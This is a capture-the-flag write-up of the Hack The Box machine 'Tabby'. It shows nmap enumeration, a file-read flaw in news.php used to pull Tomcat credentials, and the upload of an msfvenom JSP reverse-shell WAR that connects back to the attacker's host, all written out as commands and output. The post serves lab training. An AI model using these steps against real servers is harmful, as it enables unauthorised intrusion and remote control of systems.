---
layout: single
title: "Hack The Box Write-up #5 : Tabby"
excerpt: "Writeup for Tabby, a machine provided by HacktheBox."
date: 2020-11-08
toc: true
toc_sticky: true
header:
  tagline: "Writeup for Tabby , a machine provided by HacktheBox."
  overlay_image: /assets/images/background.jpg
  overlay_filter: 0.5
  actions:
    - label: "Learn More"
      url: "https://www.hackthebox.eu/home/machines/profile/259"
  teaser: /assets/images/blunder-writeup/tabby.png
  teaser_home_page: true
  
categories:
  - hackthebox
tags:  
  - linux
  - cve
  - tomcat
---


## Enumeration

### nmap
As always we start by doing a nmap scan against the host (10.10.10.194) :

```sh
root@kali:/home/pi0x73# nmap -sC -sV -T4 10.10.10.194
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-08 14:50 CET
Nmap scan report for 10.10.10.194
Host is up (0.087s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.44 seconds
```

Some interesting information can be collected through the nmap scan where we see **Tomcat Apache** running on port 8080 , a web page on port 80 and a domain (megahosting.htb).

First thing, I am going to add the domain to the hosts file and procced through the web page.

We can do so by adding **megahosting.htb** under ip : 10.10.10.194 on **/etc/hosts** file on a new line.

### web

Procceding through the webpage, we are represented with a hosting platform service :

![web](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/tabby-writeup/tabby-web.png)

Nothing much interesting till here , but after I while clicking around I saw an interesting piece of code in the page source : 

```html
<li><a href="#pricing">Infrastructure</a></li>
<li><a href="http://megahosting.htb/news.php?file=statement">News</a></li>
<li><a href="#about">About</a></li>
<li><a href="#callus">Support</a></li>
```

### file read

It seems like all of the buttons redirect to nowhere but news button has an interesting link attached. 
A php pagethat calls files from systemand shows them on the webpage so I though it was possible that we could achieve File Read from the remote host.

![lfi](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/tabby-writeup/lfi.png)

Obviously the File Read injection was successfuland I am able to read files from the system through the vulnerability. 

This could be a lot useful at the moment since we also noticed apache tomcat running on port 8080 , so I started looking around for the tomcat-users.xml file which holds the credentials configured for the administration panel.

To make the searching easier I installed **tomcat9** on my attacker machine to see where it saves the config files.

![tomcat9](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/tabby-writeup/tomcat9.png)

Using those definitive paths I could try to retrieve the config file from the remote system and see if there is any information inside it :

```xml
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>

   <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
</tomcat-users>
```

I was able to grab and read the file from the host and we can easily see the credentials for tomcat running on 8080.

However while trying to connect with the given credentials on http://10.10.10.194:8080/manager I noticed that the I could not access the GUI panel, so I started googling about possible other ways.

After some time I came up with an interesting pip module : **tomcat-manager** which could help me use the panel through CLI .

![tomcatmgr](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/tabby-writeup/tomcatmgr.png)

I found this module very helpful because not only I was able to connect to the tomcat manager service but I could also upload files through it.

### tomcat shell

So quickly create a payload using msfvenom and drop it to the web service using *tomcatmanager* :

```console
root@kali:~# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.30 LPORT=9001 -f war > shell.war
Payload size: 1090 bytes
Final size of war file: 1090 bytes

root@kali:~# tomcat-manager
tomcat-manager> connect http://10.10.10.194:8080/manager tomcat "$3cureP4s5w0rd123!"
--connected to http://10.10.10.194:8080/manager as tomcat
tomcat-manager> deploy local shell.war /zdf
tomcat-manager>
```
With the payload already uploaded to the web server , what's left to do is to navigate on ``http://10.10.10.194:8080/zdf`` in my case to triger the payload and recieve a reverse shell to my machine : 

![tomcat-shell](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/tabby-writeup/tomcat-shell.png)


